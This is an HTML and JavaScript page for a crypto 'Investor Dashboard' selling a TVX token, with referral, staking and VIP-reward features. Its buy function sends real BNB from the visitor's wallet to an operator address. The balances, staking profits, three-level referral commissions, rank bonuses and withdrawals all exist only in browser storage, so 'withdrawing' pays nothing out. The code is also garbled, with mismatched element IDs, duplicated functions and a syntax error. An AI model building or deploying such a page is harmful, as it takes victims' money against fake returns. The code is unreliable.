<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TravelX Dashboard</title>

    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>

    <style>
        body { background:#060b14; color:white; }
        .glass { background:rgba(13,19,32,0.95); border:1px solid rgba(255,255,255,0.05); }
    </style>
</head>

<body class="font-sans">

<div class="min-h-screen flex">

<!-- SIDEBAR -->
<aside class="w-72 bg-[#0d1320] p-6 hidden lg:flex flex-col">
    <h1 class="text-3xl font-black text-emerald-400 mb-10">TRAVELX</h1>

    <a class="mb-3 p-3 rounded-xl bg-emerald-400 text-black font-bold">Dashboard</a>
    <a class="mb-3 p-3 rounded-xl bg-white/5">Buy</a>
    <a class="mb-3 p-3 rounded-xl bg-white/5">Stake</a>
    <a class="mb-3 p-3 rounded-xl bg-white/5">Rewards</a>

    <div class="mt-auto text-center">
        <p class="text-xs text-gray-400">Rank</p>
        <h2 id="rank" class="text-yellow-400 font-black">NONE</h2>
    </div>
</aside>

<!-- MAIN -->
<main class="flex-1 p-6 lg:p-10 space-y-8">

<!-- TOP BAR -->
<div class="flex flex-wrap justify-between items-center gap-4">

    <div class="glass p-4 rounded-xl w-full lg:w-auto">
        <p class="text-xs text-gray-400">Referral Link</p>
        <div class="flex gap-2 mt-2">
            <input id="ref" readonly class="p-2 bg-black/40 rounded w-full">
            <button class="bg-emerald-400 text-black px-3 rounded" onclick="copyRef()">Copy</button>
        </div>
    </div>

    <div>
        <h1 class="text-2xl font-black">Investor Dashboard</h1>
        <p class="text-gray-400 text-sm">Earn rewards & stake assets</p>
    </div>

    <button onclick="connect()" class="bg-emerald-400 text-black px-5 py-3 rounded-xl font-bold">
        Connect Wallet
    </button>

</div>

<!-- STATS -->
<div class="grid grid-cols-1 md:grid-cols-4 gap-4">

    <div class="glass p-4 rounded-xl">
        <p class="text-xs text-gray-400">BNB</p>
        <h2 id="bnb" class="text-xl font-black">0</h2>
    </div>

    <div class="glass p-4 rounded-xl">
        <p class="text-xs text-gray-400">TVX</p>
        <h2 id="tvx" class="text-xl font-black text-emerald-400">0</h2>
    </div>

    <div class="glass p-4 rounded-xl">
        <p class="text-xs text-gray-400">Stake Profit</p>
        <h2 id="profit" class="text-xl font-black text-yellow-400">0</h2>
    </div>

    <div class="glass p-4 rounded-xl">
        <p class="text-xs text-gray-400">Income</p>
        <h2 id="income" class="text-xl font-black text-blue-400">0</h2>
    </div>

</div>

<!-- BUY -->
<div class="glass p-6 rounded-2xl">
    <h2 class="text-xl font-black text-emerald-400 mb-4">Buy TVX</h2>

    <input id="buyInput" type="number" class="w-full p-3 bg-black/40 rounded-xl" placeholder="BNB">

    <button onclick="buy()" class="w-full mt-4 bg-yellow-500 text-black font-black py-3 rounded-xl">
        Buy Now
    </button>
</div>

<!-- STAKE -->
<div class="glass p-6 rounded-2xl">
    <h2 class="text-xl font-black text-yellow-400 mb-4">Stake TVX</h2>

    <input id="stakeInput" type="number" class="w-full p-3 bg-black/40 rounded-xl" placeholder="Amount">

    <button onclick="stake()" class="w-full mt-4 bg-emerald-400 text-black font-black py-3 rounded-xl">
        Stake
    </button>
</div>

<!-- REWARDS -->
<div class="glass p-6 rounded-2xl">
    <h2 class="text-xl font-black text-emerald-400 mb-4">VIP Rewards</h2>

    <div class="grid md:grid-cols-3 gap-4">

        <div class="p-4 bg-black/30 rounded-xl">
            <h3 class="font-black">V1</h3>
            <p class="text-xs text-gray-400">5 Directs</p>
            <button class="mt-3 w-full bg-white/10 py-2 rounded">Locked</button>
        </div>

        <div class="p-4 bg-black/30 rounded-xl">
            <h3 class="font-black text-cyan-400">V2</h3>
            <p class="text-xs text-gray-400">5 Directs</p>
            <button class="mt-3 w-full bg-white/10 py-2 rounded">Locked</button>
        </div>

        <div class="p-4 bg-black/30 rounded-xl">
            <h3 class="font-black text-yellow-400">V3</h3>
            <p class="text-xs text-gray-400">5 Directs</p>
            <button class="mt-3 w-full bg-white/10 py-2 rounded">Locked</button>
        </div>

    </div>
</div>

<!-- WITHDRAW -->
<div class="glass p-6 rounded-2xl flex justify-between items-center">
    <div>
        <p class="text-xs text-gray-400">Available</p>
        <h1 id="balance" class="text-3xl font-black">$0.00</h1>
    </div>

    <button onclick="withdraw()" class="bg-white text-black px-6 py-3 rounded-xl font-black">
        Withdraw
    </button>
</div>

</main>
</div>

</body>
</html>


<script>
// --- CONFIGURATION ---
const RECEIVER = "YOUR_WALLET_ADDRESS"; // এখানে আপনার অ্যাড্রেস দিন
const RATE = 10000; const TVX_USD = 0.01; let BNB_USD = 600;
let account, provider, signer;

const db = () => JSON.parse(localStorage.getItem("tvx_vFinal_PRO_V3")) || {};
    function updateRefLink() {
    if (!account) return;

    const link = window.location.origin + "?ref=" + account;
    const el = document.getElementById("refLink");

    if (el) el.value = link;
}

function copyRef() {
    const el = document.getElementById("refLink");

    if (!el) return;

    el.select();
    document.execCommand("copy");

    Swal.fire("Copied!", "Referral link copied", "success");
}
const save = d => localStorage.setItem("tvx_vFinal_PRO_V3", JSON.stringify(d));

function toggleSidebar() { document.getElementById('sidebar').classList.toggle('sidebar-folded'); }

async function fetchPrice() {
    try {
        const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=binancecoin&vs_currencies=usd');
        const data = await res.json(); BNB_USD = data.binancecoin.usd;
        document.getElementById("liveBNB").innerText = "$" + BNB_USD.toFixed(2);
    } catch (e) { BNB_USD = 600; }
}

async function connect() {
    if (!window.ethereum) return Swal.fire("Error", "MetaMask Required", "error");
    const accs = await window.ethereum.request({ method: "eth_requestAccounts" });
    account = accs[0].toLowerCase();
    provider = new ethers.providers.Web3Provider(window.ethereum);
    signer = provider.getSigner();

    localStorage.setItem("connected", "true");
   
    let d = db();
    if(!d[account]) {
        let ref = new URLSearchParams(location.search).get("ref");
        d[account] = { sponsor: (ref && d[ref.toLowerCase()]) ? ref.toLowerCase() : null, directs: [], tvx: 0, bnb: 0, active: false, stakeStart: 0, txHistory: [], claimed: [] };
        if(ref && d[ref.toLowerCase()]) d[ref.toLowerCase()].directs.push(account);
        save(d);
    }
    document.getElementById("connectBtn").classList.add("hidden");
    document.getElementById("walletDisplay").classList.remove("hidden");
    document.getElementById("walletDisplay").innerText = account.slice(0,6)+"..."+account.slice(-4);
    update(); setInterval(update, 10000);
    function updateRefLink() {
    if (!account) return;

    const link = window.location.origin + "?ref=" + account;

    const el = document.getElementById("refLink");
    if (el) el.value = link;
}

function copyRef() {
    const el = document.getElementById("refLink");
    if (!el) return;

    el.select();
    document.execCommand("copy");

    Swal.fire("Copied!", "Referral link copied", "success");
}
}

async function update() {
    if (!account) return; await fetchPrice();
    let d = db(); let u = d[account]; if (!u) return;

    const bal = await provider.getBalance(account);
    document.getElementById("bnbBal").innerText = parseFloat(ethers.utils.formatEther(bal)).toFixed(4);

    let profit = (u.active && u.stakeStart > 0) ? (10000 * 0.18 * ((Date.now() - u.stakeStart) / 1000)) / 31536000 : 0;
    document.getElementById("stakeProfit").innerText = profit.toFixed(4) + " TVX";
    document.getElementById("tvxBal").innerText = (u.tvx + profit).toLocaleString();
    document.getElementById("income").innerText = u.bnb.toFixed(6);
    document.getElementById("balDisplay").innerText = "$" + ((u.bnb * BNB_USD) + (profit * TVX_USD)).toFixed(2);

    let l1 = u.directs.length; let l2 = 0, l3 = 0;
    u.directs.forEach(id => { if(d[id]) { l2 += d[id].directs.length; d[id].directs.forEach(id2 => { if(d[id2]) l3 += d[id2].directs.length; }); } });
    let totalSize = l1 + l2 + l3;

    let rank = (l1 >= 5) ? (totalSize >= 175 ? "V3 VIP" : totalSize >= 75 ? "V2 VIP" : totalSize >= 25 ? "V1 VIP" : "NONE") : "NONE";
    document.getElementById("sideRank").innerText = rank;

    ['v1', 'v2', 'v3'].forEach(r => {
        document.getElementById(`${r}Directs`).innerText = `${l1}/5`;
        document.getElementById(`${r}Bar`).style.width = `${Math.min(l1*20, 100)}%`;
        const btn = document.getElementById('claim' + r.toUpperCase());
        const target = r === 'v1' ? 25 : r === 'v2' ? 75 : 175;
        if(u.claimed.includes(r.toUpperCase())) {
            btn.innerText = "CLAIMED ✅"; btn.disabled = true; btn.className = "w-full mt-6 py-4 bg-emerald-500/20 text-emerald-400 rounded-2xl text-[10px] font-black uppercase";
        } else if(l1 >= 5 && totalSize >= target) {
            btn.innerText = "CLAIM REWARD 🎁"; btn.disabled = false; btn.className = "w-full mt-6 py-4 bg-yellow-500 text-black rounded-2xl text-[10px] font-black uppercase animate-bounce shadow-xl";
        }
    });

    document.getElementById("txList").innerHTML = u.txHistory.slice(0,8).map(t => `<tr class="border-b border-white/5 italic"><td class="py-3 text-emerald-400 italic font-bold uppercase font-mono">${t.type}</td><td class="italic">${t.amt}</td><td class="text-right text-emerald-400 italic font-bold font-mono italic">DONE</td></tr>`).join('') || '<tr><td colspan="3" class="py-6 text-center opacity-10">No History</td></tr>';

    if (u.active) {
        document.getElementById("activateBtn").innerText = "STAKING ACTIVE (18%)";
        document.getElementById("activateBtn").disabled = true;
        document.getElementById("activateBtn").classList.add("opacity-50", "cursor-not-allowed");
    }
}

async function buy() {
    let bnbAmt = document.getElementById("bnbInput").value; if (!bnbAmt || bnbAmt <= 0) return;
    try {
        const tx = await signer.sendTransaction({ to: RECEIVER, value: ethers.utils.parseEther(bnbAmt) });
        await tx.wait();
        let d = db(); let tvxGot = bnbAmt * RATE; d[account].tvx += tvxGot;
        let sponsor = d[account].sponsor;
        for (let i = 1; i <= 3; i++) {
            if (!sponsor || !d[sponsor]) break;
            let c = (i === 1 ? 0.05 : i === 2 ? 0.03 : 0.02);
            d[sponsor].tvx += (tvxGot * 0.5 * c);
            d[sponsor].bnb += ((tvxGot * 0.5 * c) * TVX_USD) / BNB_USD;
            sponsor = d[sponsor].sponsor;
        }
        d[account].txHistory.unshift({ type: 'BUY TVX', amt: bnbAmt+' BNB' });
        save(d); update(); Swal.fire("Success", "Tokens Received!", "success");
    } catch (e) { Swal.fire("Error", "Transaction Failed", "error"); }
}
/ ডাটা স্ট্রাকচার
let stakingData = JSON.parse(localStorage.getItem('tvx_staking')) || {
    stakedAmount: 0,
    startTime: null,
    lastClaimTime: null,
    totalRewards: 0,
    referralRewards: 0 // রেফারেল ইনকাম স্টোর করার জন্য
};

const DAILY_APY = 0.001; // ৩৬% / ৩৬০ দিন = ০.১%
const LOCK_PERIOD_DAYS = 360;

// স্টেক ফাংশন
function stakeTokens() {
    const amount = parseFloat(document.getElementById('stakeInput').value);
    if (isNaN(amount) || amount <= 0) {
        alert("Please enter a valid TVX amount!");
        return;
    }

    stakingData.stakedAmount += amount;
    stakingData.startTime = Date.now();
    stakingData.lastClaimTime = Date.now();
   
    saveAndRefresh();
    alert(`Staked ${amount} TVX successfully for 360 days!`);
}

// রিওয়ার্ড এবং ৩-লেভেল ডিস্ট্রিবিউশন ক্যালকুলেটর
function updateStakingUI() {
    if (!stakingData.startTime) return;

    const now = Date.now();
    const elapsedSeconds = (now - stakingData.lastClaimTime) / 1000;
    const daysInSeconds = 24 * 60 * 60;

    // ১. ইউজারের নিজস্ব ডেইলি রিওয়ার্ড (০.১%)
    const userDailyReward = (stakingData.stakedAmount * DAILY_APY * elapsedSeconds) / daysInSeconds;
    const totalLiveReward = stakingData.totalRewards + userDailyReward;

    document.getElementById('stakedReward').innerText = totalLiveReward.toFixed(6) + " TVX";

    // ২. ৩-লেভেল রেফারেল ডিস্ট্রিবিউশন লজিক (ডিসপ্লে পারপাস)
    // প্রতিদিনের রিওয়ার্ডের ১০০% (৪০%, ৩০%, ৩০%) ৩ লেভেলে যাবে
    const level1 = userDailyReward * 0.40;
    const level2 = userDailyReward * 0.30;
    const level3 = userDailyReward * 0.30;

    // ৩. আনলক টাইমার
    const unlockTime = stakingData.startTime + (LOCK_PERIOD_DAYS * 24 * 60 * 60 * 1000);
    const timeLeft = unlockTime - now;

    if (timeLeft > 0) {
        const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
        const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
        document.getElementById('unlockTimer').innerText = `${days}d ${hours}h left`;
    } else {
        document.getElementById('unlockTimer').innerText = "Principal Unlocked!";
    }
}

function saveAndRefresh() {
    localStorage.setItem('tvx_staking', JSON.stringify(stakingData));
    updateStakingUI();
}

setInterval(updateStakingUI, 1000);
window.onload = updateStakingUI;


       

function internalSwap() {
    const amt = parseFloat(document.getElementById("swapInput").value);
    let d = db(); let u = d[account]; if (!amt || u.tvx < amt) return Swal.fire("Error", "Check Balance", "error");
    u.tvx -= amt; u.bnb += (amt * TVX_USD) / BNB_USD;
    u.txHistory.unshift({ type: 'SWAP', amt: amt+' TVX to BNB' });
    save(d); update(); Swal.fire("Success", "TVX converted to Income!", "success");
}

function activate() {
    let d = db(); if (d[account].tvx < 10000) return Swal.fire("Error", "Need 10,000 TVX", "error");
    d[account].active = true; d[account].tvx -= 10000; d[account].stakeStart = Date.now();
    d[account].txHistory.unshift({ type: 'ACTIVATE', amt: '10,000 TVX' });
    save(d); update(); Swal.fire("Success", "Staking & Withdrawals Active!", "success");
}

function withdraw() {
    let d = db(); let u = d[account];
    if (!u.active) return Swal.fire("Activation Required", "Activate card to withdraw.", "warning");
    if (u.bnb <= 0) return;
    d[account].txHistory.unshift({ type: 'WITHDRAW', amt: '$'+((u.bnb*BNB_USD)).toFixed(2) });
    u.bnb = 0; save(d); update(); Swal.fire("Sent!", "Withdrawal processing...", "success");
}

function claimReward(rank, bonus) {
    let d = db(); d[account].claimed.push(rank); d[account].bnb += (bonus / BNB_USD);
    d[account].txHistory.unshift({ type: 'BONUS', amt: rank + ' Reward' });
    save(d); update(); Swal.fire("Congratulations!", `Achieving ${rank} earned you $${bonus}!`, "success");
}

function logout() { localStorage.removeItem("connected"); window.location.reload(); }
function updatePreview() { document.getElementById("previewTVX").innerText = (document.getElementById("bnbInput").value * RATE).toLocaleString() + " TVX"; }
function updateSwapPreview() {
    const tvx = document.getElementById("swapInput").value;
    document.getElementById("swapPreviewBNB").innerText = tvx ? ((tvx * TVX_USD) / BNB_USD).toFixed(6) + " BNB" : "0.0000 BNB";
}
window.addEventListener('load', () => { if (localStorage.getItem("connected") === "true") connect(); });
</script>
</body>
</html>
